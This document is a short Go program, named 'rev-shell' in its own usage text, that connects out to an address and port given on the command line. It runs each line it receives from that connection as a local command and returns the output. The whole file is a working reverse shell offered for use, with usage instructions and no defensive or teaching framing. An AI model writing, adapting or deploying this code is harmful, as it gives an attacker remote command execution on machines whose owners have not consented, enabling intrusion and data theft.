package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {

	if len(os.Args) != 3 {
		fmt.Println("Arguemnts Invalid")
		fmt.Println("Format is <script> <address> <port>")
		fmt.Println("Example: ./rev-shell 127.0.0.1 8080")
		return
	}

	address := os.Args[1]
	port := os.Args[2]

	conn, err := net.Dial("tcp", address+":"+port)

	if err != nil {
		println("Connection Refused", err)
		return
	}

	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}
		fmt.Fprintf(conn, "%s\n", out)
	}
}
